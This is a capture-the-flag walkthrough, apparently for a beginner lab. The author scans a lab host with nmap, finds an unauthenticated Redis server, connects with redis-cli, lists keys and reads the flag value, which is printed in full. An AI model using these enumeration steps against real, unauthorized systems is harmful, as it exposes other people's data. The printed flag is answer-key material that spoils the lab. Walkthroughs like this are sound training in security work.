## 🔎 Solution
With the target IP provided, I ran a full-port fast service/version scan to find any listening services:
```
nmap -p- -sV --min-rate 5000 <IP-address>
```
`-p-` instructs Nmap to scan all 65,535 TCP ports, and `--min-rate 5000` speeds the scan by sending 5000 packets per second, which significantly reduces total scan time for a full-port sweep.

```
> nmap -p- -sV --min-rate 5000 10.129.153.13

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```
The scan revealed port `6379` open and serving Redis. 
Redis is an in-memory key-value database commonly used for caching, message brokering, and lightweight data storage; 
because it primarily keeps data in RAM, it offers very low-latency reads and writes.

To interact with the service I used the Redis CLI:
```
redis-cli -h <IP-address>
```

Once connected, `INFO` returns server metadata; here it confirms `redis_version:5.0.7` and other runtime details:
```
10.129.153.13:6379> INFO
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:752
run_id:fd174c5a8079e12167063e9ccd8d51fc3f3beafd
tcp_port:6379
uptime_in_seconds:906
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:15837599
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

To work with a specific logical database in Redis use `SELECT <index>`. I switched to database `0`:
```
10.129.153.13:6379> SELECT 0
OK
```

Listing keys in the selected database with `KEYS *` returned four entries:
```
10.129.153.13:6379> KEYS *
1) "numb"
2) "temp"
3) "flag"
4) "stor"
```

I read the `flag` key with `GET` and retrieved the flag:
```
10.129.153.13:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

Summary of the flow: perform a full-port fast scan to find services, identify Redis on `6379`, connect with `redis-cli`, inspect server info, select the appropriate DB, enumerate keys, and retrieve the target value with `GET`.
